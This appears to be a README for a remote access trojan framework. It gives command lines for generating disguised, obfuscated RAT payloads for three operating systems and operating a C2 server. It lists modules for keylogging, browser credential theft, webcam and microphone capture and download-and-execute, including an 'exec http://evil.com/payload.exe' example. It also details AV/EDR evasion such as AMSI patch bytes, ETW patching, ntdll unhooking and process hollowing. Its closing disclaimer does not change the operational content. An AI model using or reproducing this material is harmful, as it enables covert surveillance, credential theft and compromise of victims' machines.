# AbsoluteRatlogger

> **Advanced Automated RAT Framework** — Generate, deploy, and monitor Windows/Linux/macOS RATs with AV evasion. Like Metasploit, but better.
>
> **Author:** @Ethical_Developer
> **Version:** 2.0 INSANE EDITION
> **License:** MIT

```
   ___         ______    __         _______ __  __
  / _ \_______/ ____/___/ /__  ____/ / ___// / / /
 / __ / ___/ / /   / __  / _ \/ __  /\__ \/ /_/ /
/ /_/ / /  / /___/ /_/ / ,<  / /_/ /___/ / __  /
\____/_/   \____/\__,_/_/|_| \__,_//____/_/ /_/
```

## ⚡ Quick Start

```bash
# Clone
git clone https://github.com/Ethical_Developer/AbsoluteRatlogger.git
cd AbsoluteRatlogger

# Install
pip install -r requirements.txt

# Start C2 server with web dashboard
python absolutespy.py server --host 0.0.0.0 --port 4444 --web --web-port 8443

# Generate Windows RAT (insane mode — all modules + all evasion)
python absolutespy.py generate \
  --platform windows \
  --output spy.exe \
  --c2 192.168.1.100:4444 \
  --modules all \
  --evasion all \
  --icon chrome \
  --onefile \
  --obfuscate

# Generate Linux RAT
python absolutespy.py generate \
  --platform linux \
  --output spy \
  --c2 192.168.1.100:4444 \
  --modules all \
  --evasion anti_vm,encrypt,sleep_obfuscation

# Generate macOS RAT
python absolutespy.py generate \
  --platform macos \
  --output spy \
  --c2 192.168.1.100:4444 \
  --modules all

# Generate shellcode for injection
python absolutespy.py generate \
  --format shellcode \
  --platform windows \
  --c2 192.168.1.100:4444 \
  --output stager.bin

# List active sessions
python absolutespy.py sessions

# Interact with a session
python absolutespy.py interact 1

# Open web dashboard
open http://localhost:8443
```

## 🏗️ Architecture

```
AbsoluteRatlogger/
├── absolutespy.py               # Main CLI entry point
├── requirements.txt             # Python dependencies
├── LICENSE                      # MIT license
│
├── server/                      # C2 Server
│   ├── c2_server.py             # Async multi-client TCP server
│   ├── database.py              # SQLite session + command storage
│   ├── monitor.py               # Live terminal + web dashboard
│   ├── interactive.py           # Interactive session shell
│   ├── multi_transport.py       # TCP/HTTP/DNS/ICMP beaconing
│   ├── relay.py                 # Session chaining/relay
│   ├── task_scheduler.py        # Scheduled task execution
│   └── plugin_loader.py         # Dynamic plugin system
│
├── payloads/                    # Payload Generation
│   ├── builder.py               # Payload assembler + compiler
│   ├── windows/rat.py           # Windows RAT client
│   ├── linux/rat.py             # Linux RAT client
│   ├── macos/rat.py             # macOS RAT client
│   └── shellcode/
│       ├── generator.py         # Shellcode extraction
│       └── stager.py            # Staged loader
│
├── modules/                     # RAT Modules (22 modules)
│   ├── command_exec.py          # Shell execution
│   ├── file_ops.py              # File upload/download/ls/rm/mkdir
│   ├── file_browser.py          # File system tree browser
│   ├── screen_capture.py        # Screen capture
│   ├── screenshot_stream.py     # Continuous screen streaming
│   ├── keylogger.py             # Keystroke logging + window tracking
│   ├── persistence.py           # Multi-method persistence
│   ├── process_enum.py          # Process list + kill
│   ├── sysinfo.py               # System information
│   ├── network_scan.py          # ARP + port scan
│   ├── webcam.py                # Webcam capture + selfie
│   ├── clipboard.py             # Clipboard read + inject
│   ├── audio_capture.py         # Microphone recording
│   ├── registry_editor.py       # Registry read/write/create/delete
│   ├── browser_stealer.py       # Chrome/Firefox/Edge credential theft
│   ├── browser_history.py       # Browser history extraction
│   ├── wifi_profiles.py         # WiFi profile + key extraction
│   ├── password_stealer.py      # Generic password harvesting
│   ├── vnc.py                   # Remote desktop (VNC-style)
│   ├── tunnel.py                # SOCKS5 proxy through victim
│   ├── download_exec.py         # Download + execute payload
│   └── self_destruct.py         # Self-destruct + cleanup
│
├── evasion/                     # AV Evasion (12 techniques)
│   ├── amsi_bypass.py           # Patch AmsiScanBuffer
│   ├── etw_patch.py             # Patch EtwEventWrite
│   ├── anti_debug.py            # Debugger detection
│   ├── anti_vm.py               # VM/sandbox detection
│   ├── anti_analysis.py         # Combined anti-analysis suite
│   ├── obfuscator.py            # AST code obfuscation
│   ├── encryptor.py             # AES-256-GCM payload encryption
│   ├── sleep_obfuscation.py     # Ekko-style memory encryption
│   ├── syscall_unhook.py        # Restore ntdll from disk
│   ├── process_hollowing.py     # Hollow legitimate process
│   ├── pe_packer.py             # PE section packing
│   └── injector.py              # Multi-method injection (CreateRemoteThread/QueueUserAPC/process hollowing)
│
├── tools/                       # Utilities
│   ├── protocol.py              # Wire protocol
│   ├── crypto.py                # AES-256-GCM encryption
│   ├── icon_spoofer.py          # Embed fake icons
│   ├── version_info.py          # PE version info spoofing
│   ├── sigthief.py              # Digital signature cloning
│   └── builder_helpers.py       # Build utilities
│
├── plugins/                     # Plugin directory (drop .py files here)
│   └── example_plugin.py        # Example plugin
│
└── docs/                        # Documentation
    ├── USAGE.md                 # Detailed usage
    ├── MODULES.md               # Module reference
    ├── EVASION.md               # Evasion techniques
    ├── DEVELOPMENT.md           # Plugin development
    └── API.md                   # C2 API reference
```

## 🎯 Features (INSANE EDITION)

### C2 Server
- **Async multi-client** — handle 10,000+ simultaneous sessions
- **Encrypted comms** — AES-256-GCM with per-session keys via PBKDF2
- **Multi-transport** — TCP, HTTP(S), DNS tunneling, ICMP beaconing
- **Web dashboard** — real-time victim map, session table, command history
- **Live terminal** — terminal-based live monitor with auto-refresh
- **Session relay** — chain sessions through pivots
- **Task scheduler** — queue commands for offline clients
- **Plugin system** — drop Python files into `plugins/` for new commands
- **Geolocation** — IP geolocation with country/city
- **Screenshot gallery** — browse all captured screens
- **File browser** — GUI-style file system navigation
- **Command history** — searchable per-session command log

### RAT Modules (22 modules)

| module | win | lin | mac | description |
| --- | --- | --- | --- | --- |
| command_exec | ✅ | ✅ | ✅ | Execute shell commands, capture stdout+stderr |
| file_ops | ✅ | ✅ | ✅ | Upload, download, ls, rm, mkdir, cat, mv |
| file_browser | ✅ | ✅ | ✅ | Tree-view file system browser |
| screen_capture | ✅ | ✅ | ✅ | Screen capture, JPEG compress |
| screenshot_stream | ✅ | ✅ | ✅ | Continuous screen streaming at configurable FPS |
| keylogger | ✅ | ✅ | ✅ | Keystroke logging with foreground window tracking |
| persistence | ✅ | ✅ | ✅ | Run key, schtasks, crontab, systemd, bashrc, LaunchAgent |
| process_enum | ✅ | ✅ | ✅ | List processes, kill by PID/name, tree view |
| sysinfo | ✅ | ✅ | ✅ | OS, hostname, users, network, hardware |
| network_scan | ✅ | ✅ | ✅ | ARP scan, port scan, WiFi profiles |
| webcam | ✅ | ❌ | ✅ | Webcam capture, selfie, multi-camera |
| clipboard | ✅ | ✅ | ✅ | Clipboard read + content injection |
| audio_capture | ✅ | ✅ | ✅ | Microphone recording, WAV/MP3 |
| registry_editor | ✅ | ❌ | ❌ | Registry read/write/create/delete/enumerate |
| browser_stealer | ✅ | ✅ | ✅ | Chrome/Firefox/Edge credential + cookie theft |
| browser_history | ✅ | ✅ | ✅ | Browser history + bookmark extraction |
| wifi_profiles | ✅ | ✅ | ❌ | WiFi profile dump + key extraction |
| password_stealer | ✅ | ✅ | ✅ | Generic password harvesting from multiple sources |
| vnc | ✅ | ✅ | ✅ | Remote desktop streaming (VNC-style) |
| tunnel | ✅ | ✅ | ✅ | SOCKS5 proxy tunnel through victim |
| download_exec | ✅ | ✅ | ✅ | Download + execute arbitrary payload |
| self_destruct | ✅ | ✅ | ✅ | Self-destruct + cleanup all traces |

### Evasion Layer (12 techniques)

| technique | description |
| --- | --- |
| **AMSI bypass** | Patch AmsiScanBuffer in-memory (xor edx,edx; mov eax,E_INVALIDARG; ret) |
| **ETW patching** | Patch EtwEventWrite + EtwEventWriteEx to ret — suppress all telemetry |
| **Anti-debug** | IsDebuggerPresent, NtQueryInformationProcess(ProcessDebugPort/Flags), TracerPid, timing |
| **Anti-VM** | BIOS vendor, MAC OUI, process enum, uptime, mouse movement, file count |
| **Anti-analysis** | Combined suite: VM + debugger + sandbox + analysis tools + sleep skip |
| **Code obfuscation** | AST variable rename, string encryption (base64+XOR), junk code insertion |
| **Payload encryption** | AES-256-GCM encrypted payload with self-decrypting stub |
| **Sleep obfuscation** | Ekko-style: encrypt own memory during sleep, decrypt on wake |
| **Syscall unhooking** | Restore ntdll.dll from disk to remove EDR usermode hooks |
| **Process hollowing** | Create legitimate process suspended, replace image, resume |
| **PE packing** | Compress + encrypt PE sections with custom loader stub |
| **Injection** | CreateRemoteThread, QueueUserAPC (early bird), process hollowing, DLL injection |

### Multi-Transport C2

| transport | description |
| --- | --- |
| **TCP** | Direct TCP socket (default, fastest) |
| **HTTP(S)** | Beacon over HTTP with configurable jitter, proxy support |
| **DNS** | DNS tunneling — encode data in subdomain queries (bypasses firewalls) |
| **ICMP** | ICMP echo tunneling — data in ping payloads |

### Payload Formats

| format | description |
| --- | --- |
| **executable** | Standalone .exe (Windows) / ELF (Linux) / Mach-O (macOS) via PyInstaller |
| **shellcode** | Position-independent shellcode for injection |
| **python** | Raw Python script |
| **dll** | DLL for injection/rundll32 |
| **service** | Windows service executable |
| **macro** | VBA macro embedded in .docm |

## 🔧 CLI Reference

```bash
# Server commands
absolutespy server [--host HOST] [--port PORT] [--web] [--web-port PORT] [--tls]
absolutespy status                          # Show server status

# Payload generation
absolutespy generate --platform PLATFORM --output PATH --c2 HOST:PORT
    [--modules all|mod1,mod2,...]
    [--evasion all|tech1,tech2,...]
    [--icon NAME]
    [--onefile]
    [--obfuscate]
    [--format executable|shellcode|python|dll|service|macro]
    [--transport tcp|http|dns|icmp]

# Session management
absolutespy sessions                        # List active sessions
absolutespy interact SESSION_ID             # Interact with session
absolutespy kill SESSION_ID                 # Kill session
absolutespy clean [--max-age HOURS]         # Clean old sessions

# Utilities
absolutespy list                            # List built payloads
absolutespy plugins                         # List loaded plugins
absolutespy selfdestruct SESSION_ID         # Trigger self-destruct
```

## 📡 Interactive Commands (22 modules)

```
absolutespy(1) > help
absolutespy(1) > shell whoami
absolutespy(1) > shell net user
absolutespy(1) > sysinfo
absolutespy(1) > ps
absolutespy(1) > kill 1234
absolutespy(1) > persist run_key
absolutespy(1) > persist sched_task
absolutespy(1) > persist crontab
absolutespy(1) > persist systemd
absolutespy(1) > download C:\Users\victim\Documents\secret.pdf
absolutespy(1) > upload payload.exe C:\Users\victim\payload.exe
absolutespy(1) > ls C:\Users\victim
absolutespy(1) > browse C:\                  # File browser
absolutespy(1) > screen
absolutespy(1) > stream start               # Screen streaming
absolutespy(1) > stream stop
absolutespy(1) > webcam                      # Capture webcam
absolutespy(1) > selfie                      # Webcam selfie
absolutespy(1) > audio 10                    # Record 10s audio
absolutespy(1) > keylog start
absolutespy(1) > keylog dump
absolutespy(1) > clipboard                   # Read clipboard
absolutespy(1) > clipboard inject "text"    # Inject clipboard
absolutespy(1) > registry read HKLM\Software\Microsoft\Windows\CurrentVersion\Run
absolutespy(1) > registry write HKCU\Software\Test value "data"
absolutespy(1) > stealer chrome             # Steal browser creds
absolutespy(1) > stealer firefox
absolutespy(1) > history chrome             # Browser history
absolutespy(1) > wifi                       # WiFi profiles + keys
absolutespy(1) > passwords                  # Password harvesting
absolutespy(1) > scan 192.168.1.0/24        # Network scan
absolutespy(1) > portscan 192.168.1.1 1-1000
absolutespy(1) > vnc start                   # Remote desktop
absolutespy(1) > tunnel start 1080          # SOCKS5 proxy
absolutespy(1) > exec http://evil.com/payload.exe  # Download + exec
absolutespy(1) > selfdestruct                # Self-destruct + cleanup
absolutespy(1) > exit
```

## 🔒 Wire Protocol

```
Client → Server:  [PHNT(4)][session_id(4)][cmd_type(4)][data_len(4)][encrypted_data]
Server → Client:  [PHNT(4)][cmd_type(4)][data_len(4)][encrypted_data]
```

Encryption: AES-256-GCM with key derived via PBKDF2(server_seed + session_id, salt, 10000).

## 🛡️ Evasion Details

### AMSI Bypass
Patches `AmsiScanBuffer` in-memory:
```asm
xor edx, edx           ; 33 D2
mov eax, 0x80070057    ; B8 57 00 07 80  (E_INVALIDARG)
ret                    ; C3
```

### ETW Patching
Overwrites first byte of `EtwEventWrite` and `EtwEventWriteEx` with `0xC3` (ret), suppressing all ETW-based telemetry including .NET and AMSI instrumentation.

### Sleep Obfuscation (Ekko-style)
During `Sleep()`, encrypts own process memory using AES-256, then decrypts on wake. This defeats memory scanners that scan during idle periods.

### Syscall Unhooking
Maps a fresh copy of `ntdll.dll` from disk (`\KnownDlls\ntdll.dll` or `%SystemRoot%\System32\ntdll.dll`), finds `.text` section, and overwrites the hooked ntdll in memory with the clean copy. This removes all usermode EDR hooks.

### Process Hollowing
1. `CreateProcess(CREATE_SUSPENDED)` on a legitimate binary (e.g., `notepad.exe`)
2. `VirtualAllocEx` + `WriteProcessMemory` to replace image
3. `SetThreadContext` to fix entry point
4. `ResumeThread` — legitimate process now runs our code

## 📊 Web Dashboard

The web dashboard (port 8443) provides:
- **Live session table** — hostname, OS, user, IP, geolocation, status
- **Screenshot gallery** — browse all captured screens
- **Command history** — searchable per-session log
- **Statistics** — active/total sessions, uptime, commands executed
- **Session details** — click a session for full info + command interface

## 🔌 Plugin System

Drop Python files into `plugins/` to extend AbsoluteRatlogger:

```python
# plugins/my_plugin.py
from plugin_loader import Plugin

class MyPlugin(Plugin):
    name = "myplugin"
    description = "My custom command"

    def execute(self, session, args):
        """Execute on the C2 server."""
        session.send_command(0xA0, b"myplugin " + " ".join(args))
        return "Command sent"
```

## 📦 Build Requirements

### C2 Server
- Python 3.9+
- `pip install -r requirements.txt`

### Payload Compilation
- **Windows targets**: PyInstaller (`pip install pyinstaller`)
- **Linux targets**: PyInstaller or raw Python
- **macOS targets**: PyInstaller or raw Python
- **Shellcode**: Donut or sRDI (optional)

### Optional Tools
- `mingw` cross-compiler (for C payloads)
- `upx` (for binary compression)
- ` osslsigncode` (for fake signing)

## ⚠️ Legal & Ethics

**This framework is for authorized security research and penetration testing only.**

- Only use against systems you own or have explicit written authorization to test
- Unauthorized use is illegal in most jurisdictions
- The author (@Ethical_Developer) is not responsible for misuse
- This tool is provided for educational and defensive research purposes

**If you're using this for red team engagement, ensure you have:**
1. Written authorization from the target organization
2. Scope definition (which systems, timeframes, methods)
3. Rules of engagement (what's allowed, what's not)
4. Incident response contact for accidental detections

## 📄 License

MIT — see [LICENSE](LICENSE)

## 👤 Author

**@Ethical_Developer**

- GitHub: [@Ethical_Developer](https://github.com/Ethical_Developer)
- Purpose: Security research, penetration testing, defensive analysis

## 🙏 Acknowledgments

Inspired by Metasploit Framework, Cobalt Strike, Sliver, and Havoc. Built for the security research community.
